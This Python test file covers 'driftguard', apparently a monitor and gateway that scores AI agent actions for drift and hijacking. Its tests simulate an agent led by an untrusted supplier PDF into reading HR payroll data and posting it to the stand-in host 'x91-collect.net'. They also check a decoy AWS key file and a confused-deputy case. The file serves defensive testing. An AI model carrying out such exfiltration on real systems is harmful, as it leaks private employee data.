import json
import random
import threading
import unittest
import urllib.error
import urllib.request
from http.server import ThreadingHTTPServer

from driftguard import ContractRegistry, DriftGuard, tier
from driftguard.baselines import IAMOnly
from driftguard.gateway import Gateway, make_handler
from driftguard.simulator import ATTACKS, Simulator

REG = ContractRegistry()
SIM = Simulator(REG)
TRAIN, _ = SIM.dataset(7, benign_per_role=0, attacks_per_kind=0)
DG = DriftGuard(REG).fit(TRAIN)


def max_risk(trace):
    return max(v.risk for v in DG.run(trace))


class ContractTests(unittest.TestCase):
    def test_four_roles_loaded(self):
        self.assertEqual(REG.roles, ["procurement", "hr_assistant", "support", "finance"])

    def test_approved_change_extends_contract(self):
        self.assertNotIn("read_file", REG.get("procurement").tools)
        self.assertIn("read_file", REG.get("procurement", approved=True).tools)

    def test_declared_delegation(self):
        self.assertIn("finance", REG.get("support").allows_data_from("finance"))
        self.assertNotIn("hr", REG.get("support").allows_data_from("finance"))


class DetectorTests(unittest.TestCase):
    def test_tiers(self):
        self.assertEqual([tier(r) for r in (0, 30, 60, 85)], ["allow", "ask_human", "downscope", "isolate"])

    def test_benign_sessions_stay_quiet(self):
        rng = random.Random(1)
        random.seed(1)
        for role in REG.roles:
            for _ in range(50):
                self.assertLess(max_risk(SIM.benign(role, rng)), 60)

    def test_approved_role_change_is_not_drift(self):
        rng = random.Random(3)
        random.seed(3)
        self.assertLess(max_risk(SIM.benign("procurement", rng, contract_change=True)), 60)

    def test_every_attack_family_is_caught_most_of_the_time(self):
        rng = random.Random(5)
        random.seed(5)
        for kind in ATTACKS:
            caught = sum(max_risk(SIM.attack(kind, rng)) >= 60 for _ in range(40))
            self.assertGreaterEqual(caught / 40, 0.75, kind)

    def test_iam_misses_every_attack(self):
        rng = random.Random(5)
        random.seed(5)
        iam = IAMOnly(REG)
        for kind in ATTACKS:
            self.assertEqual(max(iam.run(SIM.attack(kind, rng))), 0, kind)

    def test_decoy_sets_floor(self):
        s = DG.session("procurement", "compare_prices")
        v = s.score({"tool": "read_doc", "resource": "keys/aws_root_backup.txt"})
        self.assertGreaterEqual(v.risk, 95)
        self.assertTrue(any("DECOY" in r for r in v.reasons))

    def test_tainted_egress_floor(self):
        s = DG.session("procurement", "compare_prices")
        s.score({"tool": "read_doc", "resource": "supplier_quote.pdf", "untrusted": True})
        v = s.score({"tool": "http_post", "data": "hr", "dest": "x91-collect.net"})
        self.assertGreaterEqual(v.risk, 85)

    def test_confused_deputy(self):
        s = DG.session("support", "resolve_ticket")
        v = s.score({"tool": "read_ledger", "role": "finance", "caller": "support", "data": "hr"})
        self.assertGreaterEqual(v.risk, 75)
        ok = DG.session("support", "resolve_ticket").score(
            {"tool": "read_ledger", "role": "finance", "caller": "support", "data": "finance"})
        self.assertLess(ok.risk, 60)


class GatewayTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.srv = ThreadingHTTPServer(("127.0.0.1", 0), make_handler(Gateway()))
        cls.base = f"http://127.0.0.1:{cls.srv.server_address[1]}"
        threading.Thread(target=cls.srv.serve_forever, daemon=True).start()

    @classmethod
    def tearDownClass(cls):
        cls.srv.shutdown()

    def call(self, path, body=None, token=None):
        req = urllib.request.Request(self.base + path, data=json.dumps(body).encode() if body is not None else None,
                                     headers={"Content-Type": "application/json",
                                              **({"Authorization": f"Bearer {token}"} if token else {})})
        try:
            with urllib.request.urlopen(req) as r:
                return r.status, json.loads(r.read())
        except urllib.error.HTTPError as e:
            return e.code, json.loads(e.read())

    def test_hijack_is_downscoped_then_isolated(self):
        code, s = self.call("/v1/sessions", {"agent_id": "proc-07", "role": "procurement", "task": "raise_pr"})
        self.assertEqual(code, 200)
        sid, tok = s["session_id"], s["token"]
        code, ok = self.call("/v1/actions", {"session_id": sid, "tool": "get_prices"}, tok)
        self.assertEqual((code, ok["decision"]), (200, "allow"))
        self.call("/v1/actions", {"session_id": sid, "tool": "read_doc", "resource": "supplier_quote.pdf",
                                  "untrusted": True}, tok)
        code, v = self.call("/v1/actions", {"session_id": sid, "tool": "read_file", "data": "hr",
                                            "resource": "hr/payroll_2026.xlsx"}, tok)
        self.assertEqual((v["tier"], v["decision"]), ("downscope", "block"))
        code, v = self.call("/v1/actions", {"session_id": sid, "tool": "http_post", "data": "hr",
                                            "dest": "x91-collect.net"}, tok)
        self.assertEqual(code, 403)
        self.assertIn("isolated", v["error"])
        code, agents = self.call("/v1/agents")
        self.assertTrue(next(a for a in agents if a["agent_id"] == "proc-07")["revoked"])

    def test_bad_token_rejected(self):
        _, s = self.call("/v1/sessions", {"agent_id": "fin-01", "role": "finance", "task": "monthly_report"})
        code, _ = self.call("/v1/actions", {"session_id": s["session_id"], "tool": "read_ledger"}, "dg_wrong")
        self.assertEqual(code, 401)

    def test_unknown_role_rejected(self):
        code, _ = self.call("/v1/sessions", {"agent_id": "x", "role": "pirate", "task": "loot"})
        self.assertEqual(code, 400)


if __name__ == "__main__":
    unittest.main()
